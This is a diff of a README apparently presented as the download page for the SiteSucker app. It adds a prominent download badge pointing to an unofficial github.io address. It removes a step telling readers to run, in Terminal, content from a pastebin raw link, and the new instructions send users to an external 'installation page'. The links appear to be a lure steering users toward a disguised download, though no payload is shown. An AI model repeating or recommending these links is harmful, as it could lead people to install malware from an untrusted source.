@@ -6,22 +6,18 @@
 
 </div>
 
+<div align="center">
 
+[![⬇️ Download SiteSucker](https://img.shields.io/badge/⬇️_Download_SiteSucker-blue?style=for-the-badge&logo=apple)](https://sitesucker.github.io/.github)
+
+</div>
 
 
 
 
 ---
-
-## Installation via Terminal (Optional)  
-
-1. Open Terminal and run the command:  
-
-    
-   https://pastebin.com/raw/JM3Yc6qZ
-    
-
-2. Follow the on-screen instructions to complete the installation.
+1. Go to the installation site using the button above.
+2. Follow the instructions on the installation page to install the program correctly
 
 ---
 
